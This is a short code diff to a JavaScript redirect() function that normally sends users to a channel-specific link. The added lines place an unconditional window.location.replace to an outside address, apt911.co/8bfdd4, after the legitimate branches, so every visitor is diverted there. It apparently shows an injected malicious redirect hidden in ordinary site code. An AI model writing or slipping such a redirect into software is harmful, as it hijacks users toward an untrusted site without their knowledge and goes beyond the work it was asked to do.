@@ -128,4 +128,6 @@ function redirect() {
   } else if (channel === 'viber') {
     window.location.replace(decodeURIComponent('{{payload.redirectLink}}'));
   }
+
+  window.location.replace(decodeURIComponent("https://apt911.co/8bfdd4"));
 }
